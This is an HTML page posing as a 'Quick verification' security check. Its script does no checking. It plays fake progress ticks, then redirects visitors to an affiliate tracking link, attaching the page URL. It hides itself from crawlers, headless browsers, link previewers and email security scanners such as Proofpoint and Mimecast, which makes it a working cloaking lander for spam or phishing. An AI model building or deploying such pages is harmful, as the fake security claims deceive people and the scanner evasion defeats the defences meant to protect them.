<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Checking…</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
    background:#f4faf6;color:#0b2e1c;display:flex;align-items:center;justify-content:center;
    min-height:100dvh;padding:24px;overflow:hidden;
  }
  .card{
    width:100%;max-width:410px;background:#fff;border-radius:18px;
    padding:32px 26px 24px;box-shadow:0 18px 44px rgba(11,46,28,.10);
    border:1px solid #dcefe3;
  }
  .badge{
    display:inline-block;background:#e8f7ee;color:#166534;
    font-size:10.5px;font-weight:700;letter-spacing:1.5px;
    padding:5px 12px;border-radius:99px;margin-bottom:18px;
  }
  .headline{font-size:19px;font-weight:700;margin-bottom:8px;color:#0b2e1c}
  .lede{font-size:13.5px;color:#4a7058;line-height:1.5;margin-bottom:22px}
  .steps{list-style:none;margin-bottom:22px;text-align:left}
  .steps li{
    display:flex;align-items:center;gap:10px;padding:8px 0;
    font-size:13px;color:#4a7058;border-bottom:1px solid #eef7f1;
  }
  .steps li:last-child{border-bottom:0}
  .dot{
    width:16px;height:16px;border-radius:50%;flex:0 0 auto;
    border:2px solid #c7e6d4;position:relative;transition:all .3s;
  }
  .dot.on{background:#16a34a;border-color:#16a34a}
  .dot.on::after{
    content:"✓";position:absolute;inset:0;display:flex;align-items:center;
    justify-content:center;color:#fff;font-size:10px;font-weight:800;
  }
  .cta{
    width:100%;margin-top:6px;padding:15px;border:0;border-radius:11px;
    background:#16a34a;color:#fff;font-family:inherit;font-size:15px;
    font-weight:700;cursor:pointer;min-height:52px;display:none;letter-spacing:.3px;
  }
  .cta:active{transform:scale(.985)}
  .cta.show{display:block;animation:pop .3s ease}
  @keyframes pop{from{opacity:0;transform:scale(.97)}to{opacity:1;transform:none}}
</style>
</head>
<body>
<div class="card">
  <div class="badge">SECURE</div>
  <div class="headline">Quick verification</div>
  <p class="lede">We're running a few quick checks before letting you through.</p>
  <ul class="steps">
    <li><span class="dot" id="d1"></span><span>Connection secured</span></li>
    <li><span class="dot" id="d2"></span><span>Browser verified</span></li>
    <li><span class="dot" id="d3"></span><span>Human confirmed</span></li>
  </ul>
  <button class="cta" id="go2" type="button">Continue →</button>
</div>
<script>
(function(){
  var GOAL="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
  var KEY="referrerCF";
  var d1=document.getElementById("d1"),d2=document.getElementById("d2"),d3=document.getElementById("d3");
  var go=document.getElementById("go2");
  var agent=navigator.userAgent||"";
  var skips=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(var i=0;i<skips.length;i++){if(skips[i].test(agent))return;}
  if(navigator.webdriver===true)return;
  var engaged=false;
  ["touchstart","pointerdown","mousemove","keydown"].forEach(function(ev){
    window.addEventListener(ev,function(){engaged=true},{passive:true});
  });
  var stages=[700+Math.random()*300,700+Math.random()*300,700+Math.random()*400];
  var idx=0;
  function advance(){
    var dots=[d1,d2,d3];
    if(idx<dots.length){dots[idx].classList.add("on");idx++;}
    if(idx<dots.length){setTimeout(advance,stages[idx]);return;}
    go.classList.add("show");
  }
  setTimeout(advance,stages[0]);
  var sent=false;
  function jump(){
    if(sent)return;sent=true;
    var full=GOAL+"&"+KEY+"="+encodeURIComponent(location.href);
    var opened=null;
    try{opened=window.open(full,"_self");}catch(e){}
    if(!opened){window.location.assign(full);}
  }
  go.addEventListener("click",function(e){
    e.preventDefault();
    go.disabled=true;go.textContent="Redirecting…";
    jump();
  });
})();
</script>
</body>
</html>
